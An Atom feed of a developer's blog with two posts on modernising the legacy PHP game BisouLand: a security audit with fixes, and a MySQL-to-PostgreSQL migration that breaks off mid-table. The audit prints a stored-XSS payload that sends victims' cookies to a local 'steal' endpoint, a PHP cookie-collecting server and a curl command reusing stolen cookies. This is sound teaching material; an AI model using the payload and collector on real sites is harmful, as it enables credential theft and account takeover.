<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title><![CDATA[Lo√Øc Faugeron]]></title>
    <link href="/feed/atom.xml" rel="self"/>
    <link href="/"/>
    <updated>2026-01-21T07:08:18+00:00</updated>
    <id>http://gnugat.github.com</id>
            <author>
            <name><![CDATA[Lo√Øc Faugeron]]></name>            <email><![CDATA[faugeron.loic@gmail.com]]></email>        </author>
        <generator uri="http://sculpin.io/">Sculpin</generator>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 9: XSS Vulnerability]]></title>
            <link href="/2026/01/21/xl-9-xss-vulnerability.html"/>
            <updated>2026-01-21T00:00:00+00:00</updated>
            <id>/2026/01/21/xl-9-xss-vulnerability.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò Awakened by the sins of forgotten sanitization,
  the Cookie Burglar breaches the walls of client-side trust,
  stealing credentials from the altar of the Script Injector with its serpentine payloads! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
<li><a href="/2025/10/22/xl-5-pdo.html">‚õÉ migrated to PDO</a></li>
<li><a href="/2025/11/19/xl-6-php-8.html">üêò upgraded PHP 5 to PHP 8</a></li>
<li><a href="/2025/11/26/xl-7-rector.html">üè° applied automated refactorings using Rector</a></li>
<li><a href="/2025/12/03/xl-8-postgresql.html">üêò migrated from MySQL to PostgreSQL</a></li>
</ol>

<p>This means we can run it locally (http://localhost:43000/),
and have some level of automated tests.</p>

<p>When migrating from the deprecated PHP extension <code>mysql</code> to <code>PDO</code>,
we were expecting to find some SQL injection vulnerabilities,
as the queries were written by concatenating user input.</p>

<p>But to our surprise, none of these were exploitable,
as the user input was sanitised and validated
(e.g. only 15 alphanumerical characters for the username, <code>addslashes</code>, <code>htmlentities</code>, ...).</p>

<p>Still, <a href="https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software#secure-php-databases">following the Secure PHP Database recommendations</a>, we:</p>

<ul>
<li>migrated away from user input concatenated in the SQL query to prepared statements</li>
<li>made sure to disable emulated prepared statement</li>
</ul>

<p>In today's article, we'll explore an actually exploitable vulnerability
which allows an attacker to steal a victim's credentials and impersonate them.</p>

<ul>
<li><a href="#the-vulnerabilities">The vulnerabilities</a>

<ul>
<li><a href="#weak-password-hashing">Weak password hashing</a></li>
<li><a href="#credentials-in-cookies">Credentials in cookies</a></li>
<li><a href="#unsafe-cookies">Unsafe cookies</a></li>
<li><a href="#xss-in-private-messages">XSS in private messages</a></li>
</ul></li>
<li><a href="#attack-demonstration">Attack demonstration</a></li>
<li><a href="#remediation">Remediation</a>

<ul>
<li><a href="#password-hashing-functions">Password hashing functions</a></li>
<li><a href="#auth-token-in-cookies">Auth Token in cookies</a></li>
<li><a href="#escaping-user-input">Escaping user input</a></li>
</ul></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="the-vulnerabilities">The Vulnerabilities</h2>

<p>First we're going to look at different sections of the code.</p>

<h3 id="authentication">Authentication</h3>

<p>Let's start with how logging in is handled:</p>

<pre><code class="php">// phpincludes/app.php
// ---------- Visitor Logs in

if ('POST' === $_SERVER['REQUEST_METHOD'] &amp;&amp; isset($_POST['connexion'])) {
    // Ensuite on v√©rifie que les variables existent et contiennent quelque chose :)
    if (isset($_POST['pseudo'], $_POST['mdp']) &amp;&amp; !empty($_POST['pseudo']) &amp;&amp; !empty($_POST['mdp'])) {
        // Mesure de s√©curit√©, notamment pour √©viter les injections sql.
        // Le htmlentities √©vitera de le passer par la suite.
        $pseudo = htmlentities((string) $_POST['pseudo']);
        $mdp = htmlentities((string) $_POST['mdp']);
        // Hashage du mot de passe.
        $mdp = md5($mdp);

        // ---------- Persist the authentication (cookie creation)
        // La requ√™te qui compte le nombre de pseudos
        $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo = :pseudo');
        $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);

        // La on v√©rifie si le nombre est diff√©rent que z√©ro
        if (0 != $stmt-&gt;fetchColumn()) {
            // S√©lection des informations.
            $stmt = $pdo-&gt;prepare('SELECT id, confirmation, mdp, nuage FROM membres WHERE pseudo = :pseudo');
            $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);
            $donnees_info = $stmt-&gt;fetch();

            if (isset($_POST['auto'])) {
                $timestamp_expire = time() + 30 * 24 * 3600;
                setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
                setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
            }
        }
    }
}
</code></pre>

<p>And here's how the cookie based authentication is done:</p>

<pre><code class="php">// phpincludes/app.php
// ---------- Authenticate player (using cookie)

// Si on est pas connect√©.
if (false == $_SESSION['logged']) {
    $id = 0;
    // On r√©cup√®re les cookies enregistr√©s chez l'utilisateurs, s'ils sont la.
    if (isset($_COOKIE['pseudo']) &amp;&amp; isset($_COOKIE['mdp'])) {
        $pseudo = htmlentities(addslashes((string) $_COOKIE['pseudo']));
        $mdp = htmlentities(addslashes($_COOKIE['mdp']));
        // La requ√™te qui compte le nombre de pseudos
        $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo = :pseudo');
        $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);

        if (0 != $stmt-&gt;fetchColumn()) {
            // S√©lection des informations.
            $stmt = $pdo-&gt;prepare('SELECT id, confirmation, mdp, nuage FROM membres WHERE pseudo = :pseudo');
            $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);
            $donnees_info = $stmt-&gt;fetch();

            // Si le mot de passe est le m√™me (le mot de passe est d√©j√† crypt√©).
            // Si le compte est confirm√©.
            if ($donnees_info['mdp'] == $mdp &amp;&amp; true === $donnees_info['confirmation']) {
                // On modifie la variable qui nous indique que le membre est connect√©.
                $_SESSION['logged'] = true;
                // On cr√©√© les variables contenant des informations sur le membre.
                $_SESSION['id'] = $donnees_info['id'];
                $_SESSION['pseudo'] = $pseudo;
                $_SESSION['nuage'] = $donnees_info['nuage'];
                $page = 'cerveau';
            }
        }
    }
}
</code></pre>

<p>We can already spot some issues here.</p>

<h4 id="weak-password-hashing">Weak password hashing</h4>

<p>First on the list is the following:</p>

<pre><code class="php">$mdp = md5($mdp);
</code></pre>

<p>MD5 is a weak password hashing strategy for several reasons:</p>

<ul>
<li><strong>Speed</strong>: MD5 was designed to be fast (billions of hashes per second on modern hardware),
making brute-force attacks trivial

<ul>
<li><strong>Single iteration</strong>: Proper algorithms use thousands of iterations to slow attackers, MD5 uses one</li>
<li><strong>Collision vulnerability</strong>: MD5 is cryptographically broken,
as attackers can generate different inputs that produce the same hash</li>
</ul></li>
<li><strong>Rainbow tables</strong>: Precomputed hash databases allow instant lookups</li>
<li><strong>No salt</strong>: Two users with the same password get identical hashes, enabling mass cracking</li>
</ul>

<p>This means stolen MD5 hashes can be reversed to plain text passwords,
allowing attackers to access accounts and potentially other sites where victims reused passwords.</p>

<h4 id="credentials-in-cookies">Credentials in cookies</h4>

<p>Second on the list are the actual credentials (username and password) being stored in the cookies:</p>

<pre><code class="php">setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
</code></pre>

<p>This is fundamentally flawed:</p>

<ul>
<li><strong>Sent with every request</strong>: Credentials are transmitted with every HTTP request,
increasing exposure unnecessarily</li>
<li><strong>Cannot be revoked</strong>: There's no server-side session to invalidate,
the only way to revoke access is to change the password</li>
<li><strong>Client-side storage risks</strong>: Credentials persist in browser storage,
accessible to browser extensions and local malware</li>
<li><strong>Stolen cookies = stolen passwords</strong>: An attacker with the cookie hash
has the actual password hash, which can be cracked offline</li>
</ul>

<h4 id="unsafe-cookies">Unsafe cookies</h4>

<p>Third on the list is how we set the cookies:</p>

<pre><code class="php">setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
</code></pre>

<p>Here we're leaving the default settings for the following options:</p>

<ul>
<li><code>httponly</code>: defaults to <code>false</code>,
which means the cookie can be used by JavaScript scripts</li>
<li><code>secure</code>: defaults to <code>false</code>,
which means the cookie can be sent over HTTP (as opposed to only be sent through HTTPS)</li>
<li><code>samesite</code>: not set,
which means the cookie can be sent to other sites</li>
</ul>

<h3 id="private-messages">Private Messages</h3>

<p>Let's resume our review of the code as there's more,
especially with the handling of private messages which are stored in the database
as follow:</p>

<pre><code class="php">// phpincludes/fctIndex.php
function AdminMP($cible, $objet, $message, bool $lu = false): void
{
    $pdo = bd_connect();
    $castToPgBoolean = cast_to_pg_boolean();
    $castToPgTimestamptz = cast_to_pg_timestamptz();
    $message = nl2br((string) $message);

    $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nbmsg FROM messages WHERE destin = :destin');
    $stmt-&gt;execute(['destin' =&gt; $cible]);

    $nbmsg = $stmt-&gt;fetchColumn();
    if ($nbmsg &gt;= 20) {
        $Asuppr = $nbmsg - 19;
        $stmt = $pdo-&gt;prepare(
            'DELETE FROM messages'
            .' WHERE ('
            .'     destin = :destin'
            ."     AND timestamp &lt;= CURRENT_TIMESTAMP - INTERVAL '48 hours'"
            .' )'
            .' ORDER BY id LIMIT :limit',
        );
        $stmt-&gt;execute(['destin' =&gt; $cible, 'limit' =&gt; $Asuppr]);
    }

    $timestamp = time();
    $stmt = $pdo-&gt;prepare(
        'INSERT INTO messages'
        .' (id, posteur, destin, message, timestamp, statut, titre)'
        .' VALUES(:id, :posteur, :destin, :message, :timestamp, :statut, :titre)',
    );
    $stmt-&gt;execute([
        'id' =&gt; Uuid::v7(),
        'posteur' =&gt; '00000000-0000-0000-0000-000000000001',
        'destin' =&gt; $cible,
        'message' =&gt; $message,
        'timestamp' =&gt; $castToPgTimestamptz-&gt;fromUnixTimestamp($timestamp),
        'statut' =&gt; $castToPgBoolean-&gt;from($lu),
        'titre' =&gt; $objet],
    );
}
</code></pre>

<p>And finally when they are displayed, the values from the database are printed directly:</p>

<pre><code class="php">// phpincludes/lire.php
if (true === $_SESSION['logged']) {
    $pdo = bd_connect();
    $castToUnixTimestamp = cast_to_unix_timestamp();

    if (isset($_GET['idmsg']) &amp;&amp; !empty($_GET['idmsg'])) {
        $idmsg = htmlentities((string) $_GET['idmsg']);
        $stmt = $pdo-&gt;prepare('SELECT posteur, destin, message, timestamp, statut, titre FROM messages WHERE id = :id');
        $stmt-&gt;execute(['id' =&gt; $idmsg]);
        $donnees = $stmt-&gt;fetch();
        if ($donnees['destin'] == $_SESSION['id']) {
            if (false === $donnees['statut']) {
                $stmt2 = $pdo-&gt;prepare('UPDATE messages SET statut = TRUE WHERE id = :id');
                $stmt2-&gt;execute(['id' =&gt; $idmsg]);
            }
            $stmt = $pdo-&gt;prepare('SELECT pseudo FROM membres WHERE id = :id');
            $stmt-&gt;execute(['id' =&gt; $donnees['posteur']]);
            $donnees2 = $stmt-&gt;fetch();
            $from = $donnees2['pseudo'];

            $objet = $donnees['titre'];
            $message = $donnees['message'];
            $dateEnvoie = $castToUnixTimestamp-&gt;fromPgTimestamptz($donnees['timestamp']);
            ?&gt;

&lt;a href="boite.html" title="Messages"&gt;Retour √† la liste des messages&lt;/a&gt;
&lt;br /&gt;
&lt;p&gt;Auteur : &lt;?php echo stripslashes((string) $from); ?&gt;&lt;/p&gt;
&lt;p&gt;Envoy√© le &lt;?php echo date('d/m/Y √† H\hi', $dateEnvoie); ?&gt;&lt;/p&gt;
&lt;p&gt;Objet : &lt;?php echo stripslashes((string) $objet); ?&gt;&lt;/p&gt;
Message :&lt;br /&gt;
&lt;div class="message"&gt;&lt;?php echo bbLow($message); ?&gt;&lt;/div&gt;
</code></pre>

<p>There's one last problematic issue with the code above.</p>

<h4 id="xss-in-private-messages">XSS in private messages</h4>

<p>Last, but certainly not least. We can see in <code>AdminMP()</code> that private messages are stored
in the database without any validation or sanitization.</p>

<p>This allows players to write malicious code (HTML, JavaScript) in their message,
which will then be permanently stored.</p>

<p>When they are displayed, these messages are again printed as is straight from the database,
without sanitization, which means that any malicious code (HTML, JavaScript) will be displayed and executed.</p>

<p>This opens the door to Cross Site Scripting (XSS) attacks.</p>

<hr />

<h2 id="attack-demonstration">Attack demonstration</h2>

<p>Security Vulnerabilities have been found, but can they actually be used?</p>

<p>Given the lack of <code>httponly</code>, <code>secure</code> and <code>samesite</code> options,
it should be possible to obtain the credentials
(and that's without physical access to the computer!).</p>

<p>Let's demonstrate how the attack can be executed in 4 steps:</p>

<ol>
<li>Attacker logs in, and sends a private message to their victim</li>
<li>The victim logs in, checks their inbox, clicks to view the attacker's message</li>
<li>On being displayed, the message executes the JavaScript which sends the victim's cookie to the attacker's server</li>
<li>The attacker receives the cookie on their server, and can create forged cookies to authenticate as the victim</li>
</ol>

<p>Here's an example of message an attacker can craft:</p>

<pre><code>ALL YOUR BASE ARE BELONG TO US
&lt;img src=x onerror="new Image().src='http://localhost:8080/steal?c='+document.cookie"&gt;
HAHAHA
</code></pre>

<p>The <code>onerror</code> attribute will execute the JavaScript when the image fails to load,
and the <code>new Image().src</code> makes an HTTP request with the victim's cookies.</p>

<p><img alt="BisouLand screenshot" src="/images/xl-9-mischief-achived.png" width="100%" /></p>

<p>This will happen without the knowledge of the victim!</p>

<p>Here's a demo server we can use to test this:</p>

<pre><code class="php">&lt;?php
/**
 * File (for demonstration purpose only): xl-9-attacker-server.php
 *
 * Receives stolen cookies from payloads injected into the BisouLand messaging system.
 * Demonstrates how credentials are exfiltrated via JavaScript in real attack scenarios.
 *
 * Usage: php -S localhost:8080 xl-9-attacker-server.php
 */

function server_log(string $message): void {
    $receivedAt = new \DateTimeImmutable()-&gt;format('D M j H:i:s Y');

    file_put_contents('php://stderr', "[{$receivedAt}] {$message}\n");
}

// Parse cookies
$cookies = [];
parse_str(str_replace('; ', '&amp;', $_GET['c'] ?? ''), $cookies);

// Display to console
$username = $cookies['pseudo'] ?? '';
$password = $cookies['mdp'] ?? '';
server_log("c is for cookies, that's good enough for me");
server_log("  Username: {$username}");
server_log("  Password: {$password}");

// Send response
http_response_code(204);
</code></pre>

<p>The attacker will receive on their server:</p>

<pre><code>[Tue Dec 2 18:11:34 2025] c is for cookies, that's good enough for me
[Tue Dec 2 18:11:34 2025]   Username: ln42
[Tue Dec 2 18:11:34 2025]   Password: 25d55ad283aa400af464c76d713c07ad
</code></pre>

<p>And can use them to access the victim's account:</p>

<pre><code class="bash">curl --cookie 'pseudo=ln42; mdp=25d55ad283aa400af464c76d713c07ad' http://localhost:43000/cerveau.html
</code></pre>

<hr />

<h2 id="remediation">Remediation</h2>

<p>Now that we've identified the vulnerabilities, let's fix them systematically.</p>

<h3 id="password-hashing-functions">Password hashing functions</h3>

<p>Let's follow <a href="https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software#secure-php-passwords">the secure PHP Password Hashing recommendations</a>,
which suggest using the <code>password_*()</code> functions available since PHP 5.5.</p>

<p>First in <code>phpincludes/inscription.php</code>,
we'll hash the password with a proper algorithm
(as of PHP 5.5, it's Bcrypt, but might be changed for Argon2 in the future):</p>

<pre><code class="diff">- // Hashage du mot de passe avec md5().
- $hmdp = md5($mdp);
+ // Hashage du mot de passe avec Bcrypt ou Argon2.
+ $hmdp = password_hash($mdp, \PASSWORD_DEFAULT);

  $id = Uuid::v7();
  $stmt = $pdo-&gt;prepare(
      'INSERT INTO membres (id, pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
      .' VALUES (:id, :pseudo, :mdp, :confirmation, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, :amour)',
  );
  $stmt-&gt;execute([
      'id' =&gt; $id,
      'pseudo' =&gt; $pseudo,
      'mdp' =&gt; $hmdp,
      'confirmation' =&gt; $castToPgBoolean-&gt;from(true),
      'amour' =&gt; 300,
  ]);
</code></pre>

<p>Then in <code>phpincludes/app.php</code> when the visitor attempts to login,
we use <code>password_verify()</code> to compare the hash stored in the database,
and the plain text password provided:</p>

<pre><code class="diff">  $mdp = htmlentities((string) $_POST['mdp']);
  // Hashage du mot de passe.
- $mdp = md5($mdp);

  // Si le mot de passe est le m√™me.
- if ($donnees_info['mdp'] == $mdp) {
+ if (password_verify($mdp, $donnees_info['mdp'])) {
</code></pre>

<h3 id="auth-token-in-cookies">Auth Token in cookies</h3>

<p>Next, we're going to follow 
<a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence#title.2.1">the secure authentication in PHP with long term persistence</a>,
which recommend the creation of authentication tokens.</p>

<p>We're going to change the <code>Persist the authentication (cookie creation)</code> section,
replacing it with the creation of an Auth Token which we'll save in the database,
and then store in the cookie:</p>

<pre><code class="php">        // ---------- Persist the authentication (cookie creation)
        // Instead of counting matches, then selecting pseudonym
        // we directly select the account ID
        $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
            SELECT id AS account_id
            FROM membres
            WHERE pseudo = :pseudonym
        SQL);
        $stmt-&gt;execute(['pseudonym' =&gt; $pseudo]);
        /**
         * @var array&lt;{
         *     account_id: string, // UUID
         * }&gt;|false $account
         */
        $account = $stmt-&gt;fetch();
        if (false !== $account) {
            // Using Symfony\Component\Uid\Uuid
            // This is the "selector"
            $authTokenId = Uuid::v7();

            // 32 random hexadecimal characters
            // This is stored directly in the cookie
            $plainToken = bin2hex(random_bytes(16));

            // The hash is stored in the database
            // If the table's content is leaked, it won't give what the cookies hold
            $tokenHash = hash('sha256', $plainToken);

            $expiresAt = new \DateTimeImmutable('+30 days');

            $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
                INSERT INTO auth_tokens
                (auth_token_id, token_hash, account_id, expires_at)
                VALUES (:auth_token_id, :token_hash, :account_id, :expires_at)
            SQL);
            $stmt-&gt;execute([
                'auth_token_id' =&gt; $authTokenId,
                'token_hash' =&gt; $tokenHash,
                'account_id' =&gt; $account['account_id'],
                'expires_at' =&gt; $expiresAt-&gt;format('Y-m-d\\TH:i:s.uP'),
            ]);

            setcookie(
                'bl_auth_token',
                "{$authTokenId}:{$plainToken}",
                [
                    'expires' =&gt; $expiresAt-&gt;getTimestamp(),
                    // Using safer cookie settings
                    'httponly' =&gt; true,
                    'secure' =&gt; true,
                    'samesite' =&gt; 'Strict',
                    'path' =&gt; '/',
                ],
            );
        }
</code></pre>

<p>As suggested in the Paragonie article,
we now store in the cookie <code>&lt;authTokenId&gt;:&lt;token&gt;</code>,
this way it no longer contains the username and password,
so obtaining it doesn't compromise the account entirely.</p>

<p>Here's a table to store these:</p>

<pre><code class="sql">--------------------------------------------------------------------------------
-- Authentication Tokens
-- Allows secure Authentication Persistence
--------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS auth_tokens (
    auth_token_id UUID PRIMARY KEY,
    token_hash VARCHAR(64) NOT NULL,
    account_id UUID NOT NULL REFERENCES membres(id) ON DELETE CASCADE,
    created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP + '30 days'
);
</code></pre>

<p>We also need to replace the entire <code>Authenticate player (using cookie)</code> section,
to check if the cookie is valid we'll need to hash it,
and then compare it to the hash in the database using the "constant-time" <code>hash_equals</code></p>

<pre><code class="php">if (false === $_SESSION['logged'] &amp;&amp; isset($_COOKIE['bl_auth_token'])) {
    [$authTokenId, $plainToken] = explode(':', $_COOKIE['bl_auth_token'], 2);

    $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
        SELECT token_hash, account_id
        FROM auth_tokens
        WHERE auth_token_id = :auth_token_id
          AND expires_at &gt; CURRENT_TIMESTAMP
    SQL);
    $stmt-&gt;execute([
        'auth_token_id' =&gt; $authTokenId,
    ]);
    /** @var array{token_hash: string, account_id: string}|false $authToken */
    $authToken = $stmt-&gt;fetch();

    if (false !== $authToken) {
        $tokenHash = hash('sha256', $plainToken);
        if (hash_equals($authToken['token_hash'], $tokenHash)) {
            // Token is valid, get account details
            $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
                SELECT id, pseudo, nuage
                FROM membres
                WHERE id = :account_id
            SQL);
            $stmt-&gt;execute([
                'account_id' =&gt; $authToken['account_id'],
            ]);
            /** @var array{id: string, pseudo: string, nuage: int}|false $account */
            $account = $stmt-&gt;fetch();

            if (false !== $account) {
                // On modifie la variable qui nous indique que le membre est connect√©.
                $_SESSION['logged'] = true;
                // On cr√©√© les variables contenant des informations sur le membre.
                $_SESSION['id'] = $account['id'];
                $_SESSION['pseudo'] = $account['pseudo'];
                $_SESSION['nuage'] = $account['nuage'];
                $page = 'cerveau';
            }
        }
    }
}
</code></pre>

<h3 id="escaping-user-input">Escaping user input</h3>

<p>Finally, we can fix the XSS vulnerability by escaping the user-generated content,
such as the title and message content, before displaying it:</p>

<pre><code class="diff">  &lt;!-- phpincludes/lire.php --&gt;
  &lt;a href="boite.html" title="Messages"&gt;Retour √† la liste des messages&lt;/a&gt;
  &lt;br /&gt;
  &lt;p&gt;Auteur : &lt;?php echo stripslashes((string) $from); ?&gt;&lt;/p&gt;
  &lt;p&gt;Envoy√© le &lt;?php echo date('d/m/Y √† H\hi', $dateEnvoie); ?&gt;&lt;/p&gt;
- &lt;p&gt;Objet : &lt;?php echo stripslashes((string) $objet); ?&gt;&lt;/p&gt;
+ &lt;p&gt;Objet : &lt;?php echo htmlspecialchars(stripslashes((string) $objet), ENT_QUOTES, 'UTF-8'); ?&gt;&lt;/p&gt;
  Message :&lt;br /&gt;
- &lt;div class="message"&gt;&lt;?php echo bbLow($message); ?&gt;&lt;/div&gt;
+ &lt;div class="message"&gt;&lt;?php echo bbLow(htmlspecialchars($message, ENT_QUOTES, 'UTF-8')); ?&gt;&lt;/div&gt;
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>In this article, we've explored a critical vulnerability chain in BisouLand
that allowed attackers to steal user credentials through XSS attacks.</p>

<p>The combination of insecure cookie handling (storing plain username and password,
missing security flags) and unescaped user-generated content
created a perfect storm for account takeover attacks.</p>

<p>The remediation steps we've implemented ensure that:</p>

<ul>
<li>Credentials are never exposed to client-side code</li>
<li>Session cookies are protected with proper security flags</li>
<li>User-generated content is properly escaped before display</li>
<li>XSS attacks can no longer steal authentication data</li>
</ul>

<p>With these fixes in place, BisouLand is significantly more secure against
the most common web application attacks.</p>

<blockquote>
  <p>‚ÅâÔ∏è What do you mean, there's no dependency injection""?</p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 8: From MySQL to PostgreSQL]]></title>
            <link href="/2025/12/03/xl-8-postgresql.html"/>
            <updated>2025-12-03T00:00:00+00:00</updated>
            <id>/2025/12/03/xl-8-postgresql.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Legacy Executioner casts MySQL into the void of deprecated technologies,
  summoning PostgreSQL from the northern lands
  to claim dominion over schemas with its superior type system and extension arsenal! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
<li><a href="/2025/10/22/xl-5-pdo.html">‚õÉ migrated to PDO</a></li>
<li><a href="/2025/11/19/xl-6-php-8.html">üêò upgraded PHP 5 to PHP 8</a></li>
<li><a href="/2025/11/26/xl-7-rector.html">üè° applied automated refactorings using Rector</a></li>
</ol>

<p>This means we can run it locally (http://localhost:43000/),
and have some level of automated tests.</p>

<p>But it's still using the <strong>M</strong> in LAMP: MySQL.</p>

<p>Let's migrate to PostgreSQL instead,
which provides native support for some interesting types
(BOOLEAN, UUID and JSONB):</p>

<ul>
<li><a href="#docker">Docker</a></li>
<li><a href="#sql-syntax">SQL Syntax</a></li>
<li><a href="#types">Types</a>

<ul>
<li><a href="#boolean">Boolean</a></li>
<li><a href="#timestamp">Timestamp</a></li>
<li><a href="#uuid">UUID</a></li>
</ul></li>
<li><a href="#vanity-benchmark">Vanity Benchmark</a></li>
<li><a href="#database-reset">Database Reset</a></li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#bonus-improvements">Bonus Improvements</a>

<ul>
<li><a href="#filter%3A-one-query%2C-multiple-count">FILTER: One query, multiple COUNT</a></li>
<li><a href="#returning%3A-one-query%2C-a-select-and-an-update">RETURNING: One query, a select and an update</a></li>
<li><a href="#on-conflict%3A-one-query%2C-insert-or-update">ON CONFLICT: One query, insert or update</a></li>
</ul></li>
</ul>

<h2 id="docker">Docker</h2>

<p>Let's start by changing the <code>pdo_mysql</code> PHP extension to <code>pdo_pgsql</code> in <code>Dockerfile</code>:</p>

<pre><code># syntax=docker/dockerfile:1

###
# PHP Dev Container
# Utility Tools: Apache, PHP-FPM, bash, Composer
###
FROM php:8.5-fpm-alpine AS php_dev_container

# Composer environment variables:
# * default user is superuser (root), so allow them
# * put cache directory in a readable/writable location
# _Note_: When running `composer` in container, use `--no-cache` option
ENV COMPOSER_ALLOW_SUPERUSER=1 \
    COMPOSER_CACHE_DIR=/tmp/.composer/cache

# Install dependencies:
# * apache: for the webserver
# * bash: for shell access and scripting
# * postgresql: for PDO's SQL queries
# * libzip-dev: for composer packages that use ZIP archives
# _Note (Alpine)_: `--no-cache` includes `--update` and keeps image size minimal
#
# Then install PHP extensions
#
# _Note (Hadolint)_: No version locking, since Alpine only ever provides one version
# hadolint ignore=DL3018
RUN apk add --update --no-cache \
        apache2 \
        apache2-proxy \
        apache2-ssl \
        bash \
        libzip-dev \
        postgresql-dev \
    &amp;&amp; sed -i 's/^#LoadModule rewrite_module/LoadModule rewrite_module/' /etc/apache2/httpd.conf \
    &amp;&amp; docker-php-ext-install \
        pdo_pgsql

# Copy Composer binary from composer image
# _Note (Hadolint)_: False positive as `COPY` works with images too
# See: https://github.com/hadolint/hadolint/issues/197#issuecomment-1016595425
# hadolint ignore=DL3022
COPY --from=composer:2 /usr/bin/composer /usr/bin/composer

WORKDIR /apps/monolith

# Caching `composer install`, as long as composer.{json,lock} don't change.
COPY composer.json composer.lock ./
RUN composer install \
    --no-cache \
    --no-interaction \
    --no-plugins \
    --no-scripts \
    --optimize-autoloader \
    &amp;&amp; chmod -R o+rX vendor/

# Copy Apache configuration
COPY apache-site.conf /etc/apache2/conf.d/bisouland.conf

# Copy the remaining application files (excluding those listed in .dockerignore)
COPY . .

# Configure Apache proxy modules for PHP-FPM
RUN sed -i 's|^#LoadModule proxy_module|LoadModule proxy_module|' /etc/apache2/httpd.conf \
    &amp;&amp; sed -i 's|^#LoadModule proxy_fcgi_module|LoadModule proxy_fcgi_module|' /etc/apache2/httpd.conf

# Create startup script to run both PHP-FPM and Apache
RUN echo '#!/bin/sh' &gt; /start.sh \
    &amp;&amp; echo 'php-fpm -D' &gt;&gt; /start.sh \
    &amp;&amp; echo 'exec httpd -D FOREGROUND' &gt;&gt; /start.sh \
    &amp;&amp; chmod +x /start.sh

EXPOSE 80

CMD ["/start.sh"]
</code></pre>

<p>Next, we change the image from <code>mysql</code> to <code>postgresql</code> in <code>compose.yaml</code>:</p>

<pre><code class="yaml">name: bisouland-monolith

services:
  web:
    build: .
    ports:
      - "43000:80"
    volumes:
      - .:/apps/monolith
      - vendor:/apps/monolith/vendor
    depends_on:
      - db
    environment:
      DATABASE_HOST: ${DATABASE_HOST}
      DATABASE_PORT: ${DATABASE_PORT}
      DATABASE_USER: ${DATABASE_USER}
      DATABASE_PASSWORD: ${DATABASE_PASSWORD}
      DATABASE_NAME: ${DATABASE_NAME}
    restart: unless-stopped

  db:
    image: postgres:17
    platform: linux/amd64
    environment:
      POSTGRES_PASSWORD: ${DATABASE_PASSWORD}
      POSTGRES_DB: ${DATABASE_NAME}
      POSTGRES_USER: ${DATABASE_USER}
    volumes:
      - postgres_data:/var/lib/postgresql/data
    ports:
      - "127.0.0.1:43001:5432"
    restart: unless-stopped

volumes:
  postgres_data:
  vendor:
</code></pre>

<p>The <code>.env</code> file remains unchanged (we just remove the <code>MYSQL_ROOT_PASSWORD</code> envvar):</p>

<pre><code class="bash"># Database
DATABASE_HOST=db
DATABASE_PORT=5432
DATABASE_USER=bisouland
DATABASE_PASSWORD=bisouland_pass
DATABASE_NAME=bisouland
</code></pre>

<h2 id="sql-syntax">SQL Syntax</h2>

<p>MySQL and PostgreSQL vary in their SQL types and syntax,
so a first pass needs to be done to convert the SQL queries,
following this table:</p>

<table>
<thead>
<tr>
  <th>PostgreSQL</th>
  <th>MySQL</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Data Types</strong></td>
  <td></td>
</tr>
<tr>
  <td><code>SERIAL PRIMARY KEY</code></td>
  <td><code>INT PRIMARY KEY AUTO_INCREMENT</code></td>
</tr>
<tr>
  <td><code>INTEGER</code></td>
  <td><code>INT</code></td>
</tr>
<tr>
  <td><code>SMALLINT</code></td>
  <td><code>TINYINT(1)</code></td>
</tr>
<tr>
